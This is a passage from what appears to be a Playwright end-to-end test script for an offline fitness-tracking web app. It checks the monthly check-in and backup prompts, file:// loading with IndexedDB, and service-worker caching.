  await step('monthly check-in and backup nudge appear for a five-week-old plan and can be acted on', async () => {
    await opage.evaluate(async () => {
      const start = Engine.addDays(U.today(), -37);
      const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86 }, goal: 'recomp', days: [1, 2, 3, 4, 5, 6, 0], startDate: start,
        training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
      await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
      for (let d = 30; d >= 0; d--) await Store.append('weight_logged', { date: Engine.addDays(U.today(), -d), kg: 82 - d * 0.03 + 0.9 }); // dropping about 0.2 kg a week... then rising
      await Store.append('measurement_logged', { date: U.today(), site: 'waist', cm: 86.2 });
      location.hash = '#/today'; App.render();
    });
    await opage.waitForSelector('text=Monthly check-in');
    await opage.waitForSelector('text=Back up your data');
    const seen = await opage.evaluate(() => Store.getSettings().reviewSeen || 0);
    eq(seen, 0);
    await opage.getByRole('button', { name: /Got it|Keep as is/ }).click();
    await opage.waitForTimeout(250);
    ok(await opage.locator('text=Monthly check-in').count() === 0, 'card dismissed for this month');
  });
  await octx.close();

  // ================= file:// =================
  console.log('\nApp from file://');
  const fctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const fpage = await fctx.newPage();
  fpage.setDefaultTimeout(5000);
  const fproblems = await collect(fpage);
  await fpage.goto('file://' + path.join(ROOT, 'index.html'));
  await step('file:// loads, onboards and keeps data (IndexedDB works on file URLs)', async () => {
    await fpage.waitForSelector('text=Track the change.');
    await onboard(fpage);
    eq(await fpage.evaluate(() => Store.getState().plan.goal), 'recomp');
    eq(fproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems on file://');
  });
  await fctx.close();

  // ================= service worker on localhost =================
  console.log('\nService worker');
  const sctx = await browser.newContext();
  const spage = await sctx.newPage();
  await spage.goto(base);
  await step('service worker registers on localhost and caches the shell', async () => {
    await spage.waitForFunction(() => navigator.serviceWorker && navigator.serviceWorker.controller || navigator.serviceWorker.ready.then(() => true), null, { timeout: 8000 });
    await spage.waitForTimeout(800);
    const keys = await spage.evaluate(async () => { const ks = await caches.keys(); const c = await caches.open(ks[0]); return (await c.keys()).length; });
    ok(keys >= 20, 'cached ' + keys + ' files');
  });
  await sctx.close();

  await browser.close(); srv.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log('\n' + passed + ' passed, ' + failures.length + ' failed');
  if (failures.length) { console.log(failures.map((f) => ' - ' + f).join('\n')); process.exit(1); }
}
main().catch((e) => { console.error(e); process.exit(1); });
